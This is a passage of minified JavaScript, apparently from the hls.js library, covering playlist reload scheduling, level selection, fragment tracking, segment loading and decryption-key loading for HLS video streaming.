H.KEY_LOAD_TIMEOUT:case H.LEVEL_LOAD_TIMEOUT:case H.MANIFEST_LOAD_TIMEOUT:return!0}return!1}function Je(t,e){return e=Xe(e),t.default[(e?"timeout":"error")+"Retry"]}function Ze(t,e){return e="linear"===t.backoff?1:Math.pow(2,e),Math.min(e*t.retryDelayMs,t.maxRetryDelayMs)}function tr(t){return f(f({},t),{errorRetry:null,timeoutRetry:null})}function er(t,e,r,n){return!!t&&e<t.maxNumRetry&&(0===(e=n)&&!1===navigator.onLine||!!e&&(e<400||499<e)||!!r)}const rr_search=function(t,e){let r=0,n=t.length-1;for(;r<=n;){var i,a,s=e(a=t[i=(r+n)/2|0]);if(0<s)r=1+i;else{if(!(s<0))return a;n=i-1}}return null};function ir(t,e,r=0,n=0){let i=null;return t?i=e[t.sn-e[0].sn+1]||null:0===r&&0===e[0].start&&(i=e[0]),i&&0===ar(r,n,i)||!(e=rr_search(e,ar.bind(null,r,n)))||e===t&&i?i:e}function ar(t=0,e=0,r){return r.start<=t&&r.start+r.duration>t?0:(e=Math.min(e,r.duration+(r.deltaPTS||0)),r.start+r.duration-e<=t?1:r.start-e>t&&r.start?-1:0)}class dr{constructor(t,e){this.hls=void 0,this.timer=-1,this.requestScheduled=-1,this.canLoad=!1,this.log=void 0,this.warn=void 0,this.log=V.log.bind(V,e+":"),this.warn=V.warn.bind(V,e+":"),this.hls=t}destroy(){this.clearTimer(),this.hls=this.log=this.warn=null}clearTimer(){clearTimeout(this.timer),this.timer=-1}startLoad(){this.canLoad=!0,this.requestScheduled=-1,this.loadPlaylist()}stopLoad(){this.canLoad=!1,this.clearTimer()}switchParams(n,i){var a=null==i?void 0:i.renditionReports;if(a){let r=-1;for(let t=0;t<a.length;t++){var s=a[t];let e;try{e=new self.URL(s.URI,i.url).href}catch(t){V.warn("Could not construct new URL for Rendition Report: "+t),e=s.URI||""}if(e===n){r=t;break}e===n.substring(0,e.length)&&(r=t)}if(-1!==r){var e=a[r],o=parseInt(e["LAST-MSN"])||(null==i?void 0:i.lastPartSn);let t=parseInt(e["LAST-PART"])||(null==i?void 0:i.lastPartIndex);return this.hls.config.lowLatencyMode&&(e=Math.min(i.age-i.partTarget,i.targetduration),0<=t)&&e>i.partTarget&&(t+=1),new $e(o,0<=t?t:void 0,"")}}}loadPlaylist(t){-1===this.requestScheduled&&(this.requestScheduled=self.performance.now())}shouldLoadPlaylist(t){return this.canLoad&&!!t&&!!t.url&&(!t.details||t.details.live)}shouldReloadPlaylist(t){return-1===this.timer&&-1===this.requestScheduled&&this.shouldLoadPlaylist(t)}playlistLoaded(t,i,a){var{details:s,stats:o}=i,l=self.performance.now(),u=o.loading.first?Math.max(0,l-o.loading.first):0;if(s.advancedDateTime=Date.now()-u,s.live||null!=a&&a.live){if(s.reloaded(a),a&&this.log(`live playlist ${t} `+(s.advanced?"REFRESHED "+s.lastPartSn+"-"+s.lastPartIndex:s.updated?"UPDATED":"MISSED")),a&&0<s.fragments.length&&function We(t,r){let n=null;var e=t.fragments;for(let t=e.length-1;0<=t;t--){var i=e[t].initSegment;if(i){n=i;break}}t.fragmentHint&&delete t.fragmentHint.endPTS;let s,a=0;var o=t,l=r,u=(t,e)=>{t.relurl&&(a=t.cc-e.cc),N(t.startPTS)&&N(t.endPTS)&&(e.start=e.startPTS=t.startPTS,e.startDTS=t.startDTS,e.maxStartPTS=t.maxStartPTS,e.endPTS=t.endPTS,e.endDTS=t.endDTS,e.minEndPTS=t.minEndPTS,e.duration=t.endPTS-t.startPTS,e.duration&&(s=e),r.PTSKnown=r.alignedSliding=!0),e.elementaryStreams=t.elementaryStreams,e.loader=t.loader,e.stats=t.stats,e.urlId=t.urlId,t.initSegment&&(e.initSegment=t.initSegment,n=t.initSegment)},h=l.skippedSegments,c=Math.max(o.startSN,l.startSN)-l.startSN,d=(o.fragmentHint?1:0)+(h?l.endSN:Math.min(o.endSN,l.endSN))-l.startSN,f=l.startSN-o.startSN,p=l.fragmentHint?l.fragments.concat(l.fragmentHint):l.fragments,g=o.fragmentHint?o.fragments.concat(o.fragmentHint):o.fragments;for(let e=c;e<=d;e++){var v=g[f+e];let t=p[e];h&&!t&&e<h&&(t=l.fragments[e]=v),v&&t&&u(v,t)}if(n&&(r.fragmentHint?r.fragments.concat(r.fragmentHint):r.fragments).forEach((t=>{var e;t.initSegment&&t.initSegment.relurl!==(null==(e=n)?void 0:e.relurl)||(t.initSegment=n)})),r.skippedSegments)if(r.deltaUpdateFailed=r.fragments.some((t=>!t)),r.deltaUpdateFailed){V.warn("[level-helper] Previous playlist missing segments skipped in delta playlist");for(let t=r.skippedSegments;t--;)r.fragments.shift();r.startSN=r.fragments[0].sn,r.startCC=r.fragments[0].cc}else r.canSkipDateRanges&&(r.dateRanges=function(t,r,e){const n=G({},t);return e&&e.forEach((t=>{delete n[t]})),Object.keys(r).forEach((t=>{var e=new st(r[t].attr,n[t]);e.isValid?n[t]=e:V.warn(`Ignoring invalid Playlist Delta Update DATERANGE tag: "${JSON.stringify(r[t].attr)}"`)})),n}(t.dateRanges,r.dateRanges,r.recentlyRemovedDateranges));var m=r.fragments;if(a){V.warn("discontinuity sliding from playlist, take drift into account");for(let t=0;t<m.length;t++)m[t].cc+=a}r.skippedSegments&&(r.startCC=r.fragments[0].cc);var y=t.partList,E=r.partList,T=(t,e)=>{e.elementaryStreams=t.elementaryStreams,e.stats=t.stats};if(y&&E){let r=0;for(let t=0,e=y.length;t<=e;t++){var b=y[t],A=E[t+r];b&&A&&b.index===A.index&&b.fragment.sn===A.fragment.sn?T(b,A):r--}}s?Ve(r,s,s.startPTS,s.endPTS,s.startDTS,s.endDTS):Ye(t,r),m.length&&(r.totalduration=r.edge-m[0].start),r.driftStartTime=t.driftStartTime,r.driftStart=t.driftStart,o=r.advancedDateTime,r.advanced&&o?(c=r.edge,r.driftStart||(r.driftStartTime=o,r.driftStart=c),r.driftEndTime=o,r.driftEnd=c):(r.driftEndTime=t.driftEndTime,r.driftEnd=t.driftEnd,r.advancedDateTime=t.advancedDateTime)}(a,s),this.canLoad&&s.live){let e,r,n;if(s.canBlockReload&&s.endSN&&s.advanced){u=this.hls.config.lowLatencyMode;var h=s.lastPartSn,c=s.endSN,f=h===c,d=(h=(-1!==(d=s.lastPartIndex)?(r=f?c+1:h,n=f?u?0:d:d+1):r=c+1,s.age))+s.ageHeader;let t=Math.min(d-s.partTarget,1.5*s.targetduration);if(0<t&&(a&&t>a.tuneInGoal?(this.warn(`CDN Tune-in goal increased from: ${a.tuneInGoal} to: ${t} with playlist age: `+s.age),t=0):(r+=c=Math.floor(t/s.targetduration),void 0!==n&&(n+=d=Math.round(t%s.targetduration/s.partTarget)),this.log(`CDN Tune-in age: ${s.ageHeader}s last advanced ${h.toFixed(2)}s goal: ${t} skip sn ${c} to part `+n)),s.tuneInGoal=t),e=this.getDeliveryDirectives(s,i.deliveryDirectives,r,n),u||!f)return void this.loadPlaylist(e)}else(s.canBlockReload||s.canSkipUntil)&&(e=this.getDeliveryDirectives(s,i.deliveryDirectives,r,n));d=(a=this.hls.mainForwardBufferInfo)?a.end-a.len:0,h=function(t,e){let r=1e3*t.targetduration;return t.updated?(t=t.fragments).length&&4*r>e&&(e=1e3*t[t.length-1].duration)<r&&(r=e):r/=2,Math.round(r)}(s,1e3*(s.edge-d)),s.updated&&l>this.requestScheduled+h&&(this.requestScheduled=o.loading.start),void 0!==r&&s.canBlockReload?this.requestScheduled=o.loading.first+h-(1e3*s.partTarget||1e3):-1===this.requestScheduled||this.requestScheduled+h<l?this.requestScheduled=l:this.requestScheduled-l<=0&&(this.requestScheduled+=h),c=this.requestScheduled-l,c=Math.max(0,c),this.log(`reload live playlist ${t} in ${Math.round(c)} ms`),this.timer=self.setTimeout((()=>this.loadPlaylist(e)),c)}}else this.clearTimer()}getDeliveryDirectives(t,e,r,n){let i=function(t,e){var{canSkipUntil:t,canSkipDateRanges:r,endSN:n}=t;return t&&(void 0!==e?e-n:0)<t?r?"v2":"YES":""}(t,r);return null!=e&&e.skip&&t.deltaUpdateFailed&&(r=e.msn,n=e.part,i=""),new $e(r,n,i)}checkRetry(t){var i,e=t.details,r=Xe(t),n=t.errorAction,{action:i,retryCount:a=0,retryConfig:s}=n||{};if(i=!!n&&!!s&&(5===i||!n.resolved&&2===i)){if(this.requestScheduled=-1,a>=s.maxNumRetry)return!1;r&&null!=(r=t.context)&&r.deliveryDirectives?(this.warn(`Retrying playlist loading ${a+1}/${s.maxNumRetry} after "${e}" without delivery-directives`),this.loadPlaylist()):(r=Ze(s,a),this.timer=self.setTimeout((()=>this.loadPlaylist()),r),this.warn(`Retrying playlist loading ${a+1}/${s.maxNumRetry} after "${e}" in ${r}ms`)),t.levelRetry=!0,n.resolved=!0}return i}}let fr;class pr extends dr{constructor(t,e){super(t,"[level-controller]"),this._levels=[],this._firstLevel=-1,this._startLevel=void 0,this.currentLevel=null,this.currentLevelIndex=-1,this.manualLevelIndex=-1,this.steering=void 0,this.onParsedComplete=void 0,this.steering=e,this._registerListeners()}_registerListeners(){var t=this.hls;t.on($.MANIFEST_LOADING,this.onManifestLoading,this),t.on($.MANIFEST_LOADED,this.onManifestLoaded,this),t.on($.LEVEL_LOADED,this.onLevelLoaded,this),t.on($.LEVELS_UPDATED,this.onLevelsUpdated,this),t.on($.AUDIO_TRACK_SWITCHED,this.onAudioTrackSwitched,this),t.on($.FRAG_LOADED,this.onFragLoaded,this),t.on($.ERROR,this.onError,this)}_unregisterListeners(){var t=this.hls;t.off($.MANIFEST_LOADING,this.onManifestLoading,this),t.off($.MANIFEST_LOADED,this.onManifestLoaded,this),t.off($.LEVEL_LOADED,this.onLevelLoaded,this),t.off($.LEVELS_UPDATED,this.onLevelsUpdated,this),t.off($.AUDIO_TRACK_SWITCHED,this.onAudioTrackSwitched,this),t.off($.FRAG_LOADED,this.onFragLoaded,this),t.off($.ERROR,this.onError,this)}destroy(){this._unregisterListeners(),this.steering=null,this.resetLevels(),super.destroy()}startLoad(){this._levels.forEach((t=>{t.loadError=0,t.fragmentError=0})),super.startLoad()}resetLevels(){this._startLevel=void 0,this.manualLevelIndex=-1,this.currentLevelIndex=-1,this.currentLevel=null,this._levels=[]}onManifestLoading(t,e){this.resetLevels()}onManifestLoaded(t,e){const o=[],l={};let u;e.levels.forEach((t=>{var e=t.attrs,{AUDIO:r,CODECS:e,"FRAME-RATE":n,"PATHWAY-ID":i,RESOLUTION:a,SUBTITLES:s}=(-1!==(null==(r=t.audioCodec)?void 0:r.indexOf("mp4a.40.34"))&&(fr=fr||/chrome|firefox/i.test(navigator.userAgent))&&(t.audioCodec=void 0),e),i=`${i||"."}-`+t.bitrate+`-${a}-${n}-`+e;(u=l[i])?u.addFallback(t):(u=new Ke(t),l[i]=u,o.push(u)),gr(u,"audio",r),gr(u,"text",s)})),this.filterAndSortMediaOptions(o,e)}filterAndSortMediaOptions(t,r){let n=[],i=[],a=!1,s=!1,o=!1,l=t.filter((({audioCodec:t,videoCodec:e,width:r,height:n,unknownCodecs:i})=>(a=a||!(!r||!n),s=s||!!e,o=o||!!t,!(null!=i&&i.length)&&(!t||oe(t,"audio"))&&(!e||oe(e,"video")))));if(0===(l=(a||s)&&o?l.filter((({videoCodec:t,width:e,height:r})=>!!t||!(!e||!r))):l).length)Promise.resolve().then((()=>{var t;this.hls&&(t=new Error("no level with compatible codecs found in manifest"),this.hls.trigger($.ERROR,{type:K.MEDIA_ERROR,details:H.MANIFEST_INCOMPATIBLE_CODECS_ERROR,fatal:!0,url:r.url,error:t,reason:t.message}))}));else{r.audioTracks&&vr(n=r.audioTracks.filter((t=>!t.audioCodec||oe(t.audioCodec,"audio")))),r.subtitles&&vr(i=r.subtitles);var u=l.slice(0);l.sort(((t,e)=>t.attrs["HDCP-LEVEL"]!==e.attrs["HDCP-LEVEL"]?(t.attrs["HDCP-LEVEL"]||"")>(e.attrs["HDCP-LEVEL"]||"")?1:-1:t.bitrate!==e.bitrate?t.bitrate-e.bitrate:t.attrs["FRAME-RATE"]!==e.attrs["FRAME-RATE"]?t.attrs.decimalFloatingPoint("FRAME-RATE")-e.attrs.decimalFloatingPoint("FRAME-RATE"):t.attrs.SCORE!==e.attrs.SCORE?t.attrs.decimalFloatingPoint("SCORE")-e.attrs.decimalFloatingPoint("SCORE"):a&&t.height!==e.height?t.height-e.height:0));let e=u[0];if(this.steering&&(l=this.steering.filterParsedLevels(l)).length!==u.length)for(let t=0;t<u.length;t++)if(u[t].pathwayId===l[0].pathwayId){e=u[t];break}this._levels=l;for(let t=0;t<l.length;t++)if(l[t]===e){this._firstLevel=t,this.log(`manifest loaded, ${l.length} level(s) found, first bitrate: `+e.bitrate);break}t=o&&!s,t={levels:l,audioTracks:n,subtitleTracks:i,sessionData:r.sessionData,sessionKeys:r.sessionKeys,firstLevel:this._firstLevel,stats:r.stats,audio:o,video:s,altAudio:!t&&n.some((t=>!!t.url))},this.hls.trigger($.MANIFEST_PARSED,t),(this.hls.config.autoStartLoad||this.hls.forceStartLoad)&&this.hls.startLoad(this.hls.config.startPosition)}}get levels(){return 0===this._levels.length?null:this._levels}get level(){return this.currentLevelIndex}set level(t){if(0!==(e=this._levels).length){if(t<0||t>=e.length){var r=new Error("invalid level idx"),n=t<0;if(this.hls.trigger($.ERROR,{type:K.OTHER_ERROR,details:H.LEVEL_SWITCH_ERROR,level:t,fatal:n,error:r,reason:r.message}),n)return;t=Math.min(t,e.length-1)}r=this.currentLevelIndex;var e,i=(n=this.currentLevel)?n.attrs["PATHWAY-ID"]:void 0,a=(e=e[t]).attrs["PATHWAY-ID"];this.currentLevelIndex=t,this.currentLevel=e,r===t&&e.details&&n&&i===a||(this.log(`Switching to level ${t}${a?" with Pathway "+a:""} from level `+r+(i?" with Pathway "+i:"")),delete(a=G({},e,{level:t,maxBitrate:e.maxBitrate,attrs:e.attrs,uri:e.uri,urlId:e.urlId}))._attrs,delete a._urlId,this.hls.trigger($.LEVEL_SWITCHING,a),(r=e.details)&&!r.live)||(i=this.switchParams(e.uri,null==n?void 0:n.details),this.loadPlaylist(i))}}get manualLevel(){return this.manualLevelIndex}set manualLevel(t){this.manualLevelIndex=t,void 0===this._startLevel&&(this._startLevel=t),-1!==t&&(this.level=t)}get firstLevel(){return this._firstLevel}set firstLevel(t){this._firstLevel=t}get startLevel(){var t;return void 0===this._startLevel?void 0!==(t=this.hls.config.startLevel)?t:this._firstLevel:this._startLevel}set startLevel(t){this._startLevel=t}onError(t,e){!e.fatal&&e.context&&e.context.type===Te&&e.context.level===this.level&&this.checkRetry(e)}onFragLoaded(t,{frag:e}){void 0!==e&&e.type===A&&void 0!==(e=this._levels[e.level])&&(e.loadError=0)}onLevelLoaded(t,e){var{level:r,details:n}=e,i=this._levels[r];i?r===this.currentLevelIndex?(0===i.fragmentError&&(i.loadError=0),this.playlistLoaded(r,e,i.details)):null!=(i=e.deliveryDirectives)&&i.skip&&(n.deltaUpdateFailed=!0):(this.warn("Invalid level index "+r),null!=(i=e.deliveryDirectives)&&i.skip&&(n.deltaUpdateFailed=!0))}onAudioTrackSwitched(t,e){var r=this.currentLevel;if(r){var n=this.hls.audioTracks[e.id].groupId;if(r.audioGroupIds&&r.audioGroupId!==n){let e=-1;for(let t=0;t<r.audioGroupIds.length;t++)if(r.audioGroupIds[t]===n){e=t;break}-1!==e&&e!==r.urlId&&(r.urlId=e,this.canLoad)&&this.startLoad()}}}loadPlaylist(e){super.loadPlaylist();var r=this.currentLevelIndex,n=this.currentLevel;if(n&&this.shouldLoadPlaylist(n)){var i=n.urlId;let t=n.uri;if(e)try{t=e.addDirectives(t)}catch(t){this.warn("Could not construct new URL with HLS Delivery Directives: "+t)}var a=n.attrs["PATHWAY-ID"];this.log(`Loading level index ${r}${void 0!==(null==e?void 0:e.msn)?" at sn "+e.msn+" part "+e.part:""} with${a?" Pathway "+a:""} URI ${i+1}/${n.url.length} `+t),this.clearTimer(),this.hls.trigger($.LEVEL_LOADING,{url:t,level:r,id:i,deliveryDirectives:e||null})}}get nextLoadLevel(){return-1!==this.manualLevelIndex?this.manualLevelIndex:this.hls.nextAutoLevel}set nextLoadLevel(t){this.level=t,-1===this.manualLevelIndex&&(this.hls.nextAutoLevel=t)}removeLevel(r,n){const i=(t,e)=>e!==n;var t=this._levels.filter(((t,e)=>!(e===r&&(1<t.url.length&&void 0!==n?(t.url=t.url.filter(i),t.audioGroupIds&&(t.audioGroupIds=t.audioGroupIds.filter(i)),t.textGroupIds&&(t.textGroupIds=t.textGroupIds.filter(i)),t.urlId=0):(this.steering&&this.steering.removeLevel(t),1)))));this.hls.trigger($.LEVELS_UPDATED,{levels:t})}onLevelsUpdated(t,{levels:e}){e.forEach(((t,e)=>{null!=(t=t.details)&&t.fragments&&t.fragments.forEach((t=>{t.level=e}))})),this._levels=e}}function gr(t,e,r){r&&("audio"===e?(t.audioGroupIds||(t.audioGroupIds=[]),t.audioGroupIds[t.url.length-1]=r):"text"===e&&(t.textGroupIds||(t.textGroupIds=[]),t.textGroupIds[t.url.length-1]=r))}function vr(t){const r={};t.forEach((t=>{var e=t.groupId||"";t.id=r[e]=r[e]||0,r[e]++}))}var mr="NOT_LOADED",yr="APPENDING",Er="PARTIAL",Tr="OK";class br{constructor(t){this.activePartLists=Object.create(null),this.endListFragments=Object.create(null),this.fragments=Object.create(null),this.timeRanges=Object.create(null),this.bufferPadding=.2,this.hls=void 0,this.hasGaps=!1,this.hls=t,this._registerListeners()}_registerListeners(){var t=this.hls;t.on($.BUFFER_APPENDED,this.onBufferAppended,this),t.on($.FRAG_BUFFERED,this.onFragBuffered,this),t.on($.FRAG_LOADED,this.onFragLoaded,this)}_unregisterListeners(){var t=this.hls;t.off($.BUFFER_APPENDED,this.onBufferAppended,this),t.off($.FRAG_BUFFERED,this.onFragBuffered,this),t.off($.FRAG_LOADED,this.onFragLoaded,this)}destroy(){this._unregisterListeners(),this.fragments=this.activePartLists=this.endListFragments=this.timeRanges=null}getAppendedFrag(e,t){var r=this.activePartLists[t];if(r)for(let t=r.length;t--;){var n=r[t];if(!n)break;var i=n.end;if(n.start<=e&&null!==i&&e<=i)return n}return this.getBufferedFrag(e,t)}getBufferedFrag(e,r){var n=this.fragments,i=Object.keys(n);for(let t=i.length;t--;){var a=n[i[t]];if((null==a?void 0:a.body.type)===r&&a.buffered&&(a=a.body).start<=e&&e<=a.end)return a}return null}detectEvictedFragments(r,n,i,t){this.timeRanges&&(this.timeRanges[r]=n);const a=(null==t?void 0:t.fragment.sn)||-1;Object.keys(this.fragments).forEach((t=>{const e=this.fragments[t];!e||a>=e.body.sn||(e.buffered||e.loaded?(t=e.range[r])&&t.time.some((t=>((t=!this.isTimeBuffered(t.startPTS,t.endPTS,n))&&this.removeFragment(e.body),t))):e.body.type===i&&this.removeFragment(e.body))}))}detectPartialFragments(t){const n=this.timeRanges,{frag:i,part:a}=t;if(n&&"initSegment"!==i.sn){t=_r(i);const s=this.fragments[t];if(!(!s||s.buffered&&i.gap)){const o=!i.relurl;Object.keys(n).forEach((t=>{var e,r=i.elementaryStreams[t];r&&(e=n[t],r=o||!0===r.partial,s.range[t]=this.getBufferedTimes(i,a,r,e))})),s.loaded=null,Object.keys(s.range).length?(s.buffered=!0,(s.body.endList=i.endList||s.body.endList)&&(this.endListFragments[s.body.type]=s),Ar(s)||this.removeParts(i.sn-1,i.type)):this.removeFragment(s.body)}}}removeParts(e,t){var r=this.activePartLists[t];r&&(this.activePartLists[t]=r.filter((t=>t.fragment.sn>=e)))}fragBuffered(t,e){var r=_r(t);let n=this.fragments[r];!n&&e&&(n=this.fragments[r]={body:t,appendedPTS:null,loaded:null,buffered:!1,range:Object.create(null)},t.gap)&&(this.hasGaps=!0),n&&(n.loaded=null,n.buffered=!0)}getBufferedTimes(t,e,r,n){var i={time:[],partial:r},a=t.start,s=t.end,o=t.minEndPTS||s,l=t.maxStartPTS||a;for(let t=0;t<n.length;t++){var u=n.start(t)-this.bufferPadding,h=n.end(t)+this.bufferPadding;if(u<=l&&o<=h){i.time.push({startPTS:Math.max(a,n.start(t)),endPTS:Math.min(s,n.end(t))});break}if(a<h&&u<s)i.partial=!0,i.time.push({startPTS:Math.max(a,n.start(t)),endPTS:Math.min(s,n.end(t))});else if(s<=u)break}return i}getPartialFragment(e){let n,i,a,r=null,s=0;const{bufferPadding:o,fragments:l}=this;return Object.keys(l).forEach((t=>{(t=l[t])&&Ar(t)&&(i=t.body.start-o,a=t.body.end+o,e>=i)&&e<=a&&(n=Math.min(e-i,a-e),s<=n)&&(r=t.body,s=n)})),r}isEndListAppended(t){return void 0!==(t=this.endListFragments[t])&&(t.buffered||Ar(t))}getState(t){return t=_r(t),(t=this.fragments[t])?t.buffered?Ar(t)?Er:Tr:yr:mr}isTimeBuffered(e,r,n){var i,a;for(let t=0;t<n.length;t++){if(i=n.start(t)-this.bufferPadding,a=n.end(t)+this.bufferPadding,i<=e&&r<=a)return!0;if(r<=i)return!1}return!1}onFragLoaded(t,e){var r,{frag:n,part:i}=e;"initSegment"===n.sn||n.bitrateTest||(r=_r(n),this.fragments[r]={body:n,appendedPTS:null,loaded:i?null:e,buffered:!1,range:Object.create(null)})}onBufferAppended(t,e){const{frag:r,part:n,timeRanges:i}=e;if("initSegment"!==r.sn){const a=r.type;if(n){let t=this.activePartLists[a];t||(this.activePartLists[a]=t=[]),t.push(n)}this.timeRanges=i,Object.keys(i).forEach((t=>{var e=i[t];this.detectEvictedFragments(t,e,a,n)}))}}onFragBuffered(t,e){this.detectPartialFragments(e)}hasFragment(t){return t=_r(t),!!this.fragments[t]}hasParts(t){return!(null==(t=this.activePartLists[t])||!t.length)}removeFragmentsInRange(r,n,i,a,s){a&&!this.hasGaps||Object.keys(this.fragments).forEach((t=>{var e;!(t=this.fragments[t])||(e=t.body).type!==i||a&&!e.gap||e.start<n&&e.end>r&&(t.buffered||s)&&this.removeFragment(e)}))}removeFragment(t){var e=_r(t),r=(t.stats.loaded=0,t.clearElementaryStreamInfo(),this.activePartLists[t.type]);if(r){const n=t.sn;this.activePartLists[t.type]=r.filter((t=>t.fragment.sn!==n))}delete this.fragments[e],t.endList&&delete this.endListFragments[t.type]}removeAllFragments(){this.fragments=Object.create(null),this.endListFragments=Object.create(null),this.activePartLists=Object.create(null),this.hasGaps=!1}}function Ar(t){var e;return t.buffered&&(t.body.gap||(null==(e=t.range.video)?void 0:e.partial)||(null==(e=t.range.audio)?void 0:e.partial)||(null==(e=t.range.audiovideo)?void 0:e.partial))}function _r(t){return`${t.type}_${t.level}_${t.urlId}_`+t.sn}const Sr=Math.pow(2,17);class Lr{constructor(t){this.config=void 0,this.loader=null,this.partLoadTimeout=-1,this.config=t}destroy(){this.loader&&(this.loader.destroy(),this.loader=null)}abort(){this.loader&&this.loader.abort()}load(o,l){const u=o.url;if(!u)return Promise.reject(new wr({type:K.NETWORK_ERROR,details:H.FRAG_LOAD_ERROR,fatal:!1,frag:o,error:new Error("Fragment does not have a "+(u?"part list":"url")),networkDetails:null}));this.abort();const r=this.config,h=r.fLoader,c=r.loader;return new Promise(((a,i)=>{if(this.loader&&this.loader.destroy(),o.gap){if(o.tagList.some((t=>"GAP"===t[0])))return void i(Rr(o));o.gap=!1}const s=this.loader=o.loader=new(h||c)(r);var t=kr(o),e=tr(r.fragLoadPolicy.default);const n={loadPolicy:e,timeout:e.maxLoadTimeMs,maxRetry:0,retryDelay:0,maxRetryDelay:0,highWaterMark:"initSegment"===o.sn?1/0:Sr};o.stats=s.stats,s.load(t,n,{onSuccess:(t,e,r,n)=>{this.resetLoader(o,s);let i=t.data;r.resetIV&&o.decryptdata&&(o.decryptdata.iv=new Uint8Array(i.slice(0,16)),i=i.slice(16)),a({frag:o,part:null,payload:i,networkDetails:n})},onError:(t,e,r,n)=>{this.resetLoader(o,s),i(new wr({type:K.NETWORK_ERROR,details:H.FRAG_LOAD_ERROR,fatal:!1,frag:o,response:f({url:u,data:void 0},t),error:new Error(`HTTP Error ${t.code} `+t.text),networkDetails:r,stats:n}))},onAbort:(t,e,r)=>{this.resetLoader(o,s),i(new wr({type:K.NETWORK_ERROR,details:H.INTERNAL_ABORTED,fatal:!1,frag:o,error:new Error("Aborted"),networkDetails:r,stats:t}))},onTimeout:(t,e,r)=>{this.resetLoader(o,s),i(new wr({type:K.NETWORK_ERROR,details:H.FRAG_LOAD_TIMEOUT,fatal:!1,frag:o,error:new Error(`Timeout after ${n.timeout}ms`),networkDetails:r,stats:t}))},onProgress:(t,e,r,n)=>{l&&l({frag:o,part:null,payload:r,networkDetails:n})}})}))}loadPart(l,u,h){this.abort();const e=this.config,r=e.fLoader,c=e.loader;return new Promise(((i,a)=>{if(this.loader&&this.loader.destroy(),l.gap||u.gap)a(Rr(l,u));else{const s=this.loader=l.loader=new(r||c)(e),o=kr(l,u);var t=tr(e.fragLoadPolicy.default);const n={loadPolicy:t,timeout:t.maxLoadTimeMs,maxRetry:0,retryDelay:0,maxRetryDelay:0,highWaterMark:Sr};u.stats=s.stats,s.load(o,n,{onSuccess:(t,e,r,n)=>{this.resetLoader(l,s),this.updateStatsFromPart(l,u),t={frag:l,part:u,payload:t.data,networkDetails:n},h(t),i(t)},onError:(t,e,r,n)=>{this.resetLoader(l,s),a(new wr({type:K.NETWORK_ERROR,details:H.FRAG_LOAD_ERROR,fatal:!1,frag:l,part:u,response:f({url:o.url,data:void 0},t),error:new Error(`HTTP Error ${t.code} `+t.text),networkDetails:r,stats:n}))},onAbort:(t,e,r)=>{l.stats.aborted=u.stats.aborted,this.resetLoader(l,s),a(new wr({type:K.NETWORK_ERROR,details:H.INTERNAL_ABORTED,fatal:!1,frag:l,part:u,error:new Error("Aborted"),networkDetails:r,stats:t}))},onTimeout:(t,e,r)=>{this.resetLoader(l,s),a(new wr({type:K.NETWORK_ERROR,details:H.FRAG_LOAD_TIMEOUT,fatal:!1,frag:l,part:u,error:new Error(`Timeout after ${n.timeout}ms`),networkDetails:r,stats:t}))}})}}))}updateStatsFromPart(t,e){var r=t.stats,n=e.stats,i=n.total;r.loaded+=n.loaded,i?(i=((t=Math.round(t.duration/e.duration))-(e=Math.min(Math.round(r.loaded/i),t)))*Math.round(r.loaded/e),r.total=r.loaded+i):r.total=Math.max(r.loaded,r.total),t=r.loading,e=n.loading;t.start?t.first+=e.first-e.start:(t.start=e.start,t.first=e.first),t.end=e.end}resetLoader(t,e){t.loader=null,this.loader===e&&(self.clearTimeout(this.partLoadTimeout),this.loader=null),e.destroy()}}function kr(r,n=null){n={frag:r,part:n,responseType:"arraybuffer",url:(i=n||r).url,headers:{},rangeStart:0,rangeEnd:0};var a=i.byteRangeStartOffset,i=i.byteRangeEndOffset;if(N(a)&&N(i)){let t=a,e=i;"initSegment"===r.sn&&"AES-128"===(null==(r=r.decryptdata)?void 0:r.method)&&((r=i-a)%16&&(e=i+(16-r%16)),0!==a)&&(n.resetIV=!0,t=a-16),n.rangeStart=t,n.rangeEnd=e}return n}function Rr(t,e){var r=new Error(`GAP ${t.gap?"tag":"attribute"} found`);r={type:K.MEDIA_ERROR,details:H.FRAG_GAP,fatal:!1,frag:t,error:r,networkDetails:null};return e&&(r.part=e),(e||t).stats.aborted=!0,new wr(r)}class wr extends Error{constructor(t){super(t.error.message),this.data=void 0,this.data=t}}class Ir{constructor(t){this.config=void 0,this.keyUriToKeyInfo={},this.emeController=null,this.config=t}abort(t){for(const r in this.keyUriToKeyInfo){var e=this.keyUriToKeyInfo[r].loader;if(e){if(t&&t!==e.context.frag.type)return;e.abort()}}}detach(){for(const e in this.keyUriToKeyInfo){var t=this.keyUriToKeyInfo[e];(t.mediaKeySessionContext||t.decryptdata.isCommonEncryption)&&delete this.keyUriToKeyInfo[e]}}destroy(){this.detach();for(const e in this.keyUriToKeyInfo){var t=this.keyUriToKeyInfo[e].loader;t&&t.destroy()}this.keyUriToKeyInfo={}}createKeyLoadError(t,e=H.KEY_LOAD_ERROR,r,n,i){return new wr({type:K.NETWORK_ERROR,details:e,fatal:!1,frag:t,response:i,error:r,networkDetails:n})}loadClear(t,e){if(this.emeController&&this.config.emeEnabled){var{sn:r,cc:n}=t;for(let t=0;t<e.length;t++){const i=e[t];if(n<=i.cc&&("initSegment"===r||"initSegment"===i.sn||r<i.sn)){this.emeController.selectKeySystemFormat(i).then((t=>{i.setKeyFormat(t)}));break}}}}load(e){return!e.decryptdata&&e.encrypted&&this.emeController?this.emeController.selectKeySystemFormat(e).then((t=>this.loadInternal(e,t))):this.loadInternal(e)}loadInternal(e,t){t&&e.setKeyFormat(t);const r=e.decryptdata;if(!r)return t=new Error(t?"Expected frag.decryptdata to be defined after setting format "+t:"Missing decryption data on fragment in onKeyLoading"),Promise.reject(this.createKeyLoadError(e,H.KEY_LOAD_ERROR,t));var n;if(!(t=r.uri))return Promise.reject(this.createKeyLoadError(e,H.KEY_LOAD_ERROR,new Error(`Invalid key URI: "${t}"`)));let i=this.keyUriToKeyInfo[t];if(null!=(n=i)&&n.decryptdata.key)return r.key=i.decryptdata.key,Promise.resolve({frag:e,keyInfo:i});if(null!=(n=i)&&n.keyLoadPromise)switch(null==(n=i.mediaKeySessionContext)?void 0:n.keyStatus){case void 0:case"status-pending":case"usable":case"usable-in-future":return i.keyLoadPromise.then((t=>(r.key=t.keyInfo.decryptdata.key,{frag:e,keyInfo:i})))}switch(i=this.keyUriToKeyInfo[t]={decryptdata:r,keyLoadPromise:null,loader:null,mediaKeySessionContext:null},r.method){case"ISO-23001-7":case"SAMPLE-AES":case"SAMPLE-AES-CENC":case"SAMPLE-AES-CTR":return"identity"===r.keyFormat?this.loadKeyHTTP(i,e):this.loadKeyEME(i,e);case"AES-128":return this.loadKeyHTTP(i,e);default:return 